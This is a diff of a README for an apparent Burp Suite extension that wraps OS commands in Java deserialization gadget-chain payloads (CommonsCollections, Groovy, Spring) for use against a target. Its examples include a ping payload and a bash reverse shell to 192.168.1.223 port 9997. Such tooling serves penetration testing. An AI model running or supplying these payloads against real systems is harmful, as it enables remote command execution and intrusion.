@@ -20,6 +20,7 @@ There are 3 ways to run this extension.
   - CC2 or CollectionCommons2
   - GV1 or Groovy1
   - SP1 or Spring1
+  
  The second parameter is obviously the OS command you wish to run.
  
 ## Complex Commands (i.e. pipes and I/O redirection)
@@ -46,12 +47,14 @@ The above code will be split into a string array that java can run on the victim
 
 ### Example 2 - Use and inline command
 1. In Burp Repeater replace your parameter with the following code:
- ```$(CC1|ping -c1 8.8.8.8)```
+
+```$(CC1|ping -c1 8.8.8.8)```
 2. Select the above text. Right Click in repeater and select the payload type.
 ![Payload Generator](/inline-command.png)
 
 ### Example 3 - Complex commands 
 1. In Repeater replace your parameter with the following command:
+
 ```$(CC1|/bin/bash,,-c,,bash -i >& /dev/tcp/192.168.1.223/9997 0>&1)```
 2. Select it and select the payload you want to generate.
 ![Payload Generator](/inline%20complex%20command.png)
